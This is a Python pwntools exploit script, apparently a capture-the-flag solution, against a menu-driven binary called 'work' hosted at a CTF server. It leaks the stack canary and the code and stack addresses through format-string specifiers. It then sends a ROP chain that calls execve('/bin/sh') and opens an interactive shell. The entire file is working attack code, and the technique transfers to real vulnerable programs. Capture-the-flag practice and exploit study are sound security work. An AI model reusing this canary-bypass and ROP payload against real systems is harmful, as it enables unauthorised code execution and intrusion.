#!/root/bin/python3

from pwn import *

exe = ELF("../work")

context.binary = exe
entry = b'5. Remove Plate\n'
motivational = b'6. Motivational Quote\n'

def motivate(p):
    for x in range(0, 5):
        p.recvuntil(entry);
        p.sendline(b'3');

    for x in range(0, 6):
        p.recvuntil(entry);
        p.sendline(b'4');

def get_cookie(p):
    p.recvuntil(motivational)
    p.sendline(b'6')

    p.recvuntil(b'Enter your motivational quote: ')
    p.sendline(b'%9$p')

    cookie = int(p.recvline().split(b'"')[1].strip().decode(), 16)

    return p64(cookie)

def get_main(p):
    p.recvuntil(motivational)
    p.sendline(b'6')

    p.recvuntil(b'Enter your motivational quote: ')
    p.sendline(b'%17$p')

    main = int(p.recvline().split(b'"')[1].strip().decode(), 16)

    return main

def get_stack(p): # eg: 0x7ffc459da288
    p.recvuntil(motivational)
    p.sendline(b'6')

    p.recvuntil(b'Enter your motivational quote: ')
    p.sendline(b'%19$p')

    stack = int(p.recvline().split(b'"')[1].strip().decode(), 16)

    return stack

def gen_payload(cookie, stack, main):
    print(hex(stack))
    print(hex(main))
    padding = b'A'*8

    the_boats = main - 30
    #the_boats = main - 69

    pop_rax = p64(the_boats + 8)
    pop_rdi = p64(the_boats + 12)
    pop_rdx = p64(the_boats + 14)
    pop_rsi = p64(the_boats + 16)
    syscall = p64(the_boats + 20)

    nulls = p64(0x0)
    bin_sh = b'/bin/sh\0' # 0x2f62696e2f736800
    #bin_sh = b'\0hs/nib/'
    execve = p64(0x3b)

    payload = padding
    payload += cookie
    payload += padding
    payload += pop_rax
    payload += execve
    payload += pop_rsi
    payload += nulls
    payload += pop_rdx
    payload += nulls
    payload += pop_rdi
    payload += p64(stack - 328 + 96)
    payload += syscall
    payload += bin_sh
    payload += p64(ord('\n'))

    if len(payload) >= 1000:
        print("Payload larger than fgets buffer!")
        print(f"Length is {len(payload)}")
        exit(0)
    else:
        with open("payload.txt", "wb") as file:
            file.write(payload)

    return payload

def pwn(p):
    motivate(p)
    b_cookie = get_cookie(p)
    i_main = get_main(p)
    i_stack = get_stack(p)

    payload = gen_payload(b_cookie, i_stack, i_main)
    #payload = b"a"*32

    p.recvuntil(motivational)
    p.sendline(b'6')
    print(p.recvuntil(b'Enter your motivational quote: '))
    p.sendline(payload)
    #print(p.recvline())
    #print(p.recvline())
    #print(p.recvline())
    #print(p.recvline())

def conn():
    #args.LOCAL = True
    args.LOCAL = False
    if args.LOCAL:
        r = process([exe.path])
        #r = process(["strace", "-o", "strace.out", exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        #r = remote("bench-225.ctf.umasscybersec.org", 1337)
        r = remote("challenges.carolinacon.org", 8007)

    pwn(r)

    return r


def main():
    r = conn()

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
